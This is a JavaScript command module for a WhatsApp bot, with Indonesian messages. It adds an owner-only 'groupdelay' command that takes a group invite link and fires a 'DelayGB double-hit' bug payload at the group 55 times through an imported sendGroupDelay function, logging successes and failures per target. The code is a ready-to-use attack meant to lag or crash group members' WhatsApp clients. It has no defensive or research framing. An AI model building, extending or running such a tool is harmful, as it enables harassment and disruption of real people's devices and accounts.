import {
  sendGroupDelay,
  parseGroupInviteCode,
  replyProcessing,
  replyDone,
  replyFailed,
} from "@/src/services/system/bug/index.js";

export default {
  name: "groupdelay",
  aliases: [],
  description: "Kirim bug DelayGB double-hit ke grup via link (55 iterasi)",
  usage: "https://chat.whatsapp.com/xxxx",
  category: "Bug",
  ownerOnly: true,
  run: async (sock, msg, args, { reply, prefix, commandName, logger }) => {
    const q = args.join(" ").trim();
    if (!q) return reply(`*Syntax Error*\nExample: ${prefix + commandName} https://chat.whatsapp.com/xxxx`);

    const codeGroup = parseGroupInviteCode(q);
    if (!codeGroup) return reply("*Link group tidak valid*");

    await replyProcessing(reply, q, commandName);

    (async () => {
      const log = logger || console;
      try {
        const { target, success, failed, ms } = await sendGroupDelay(sock, q, { logger: log });
        log?.info?.(`[groupdelay] selesai! sukses: ${success} | gagal: ${failed} | target: ${target}`);
        await replyDone(reply, target, commandName, { success, failed, ms }).catch(() => {});
      } catch (e) {
        log?.error?.(`[background Error - groupdelay]: ${e?.message || e}`);
        await replyFailed(reply, q, commandName, e).catch(() => {});
      }
    })();
  },
};
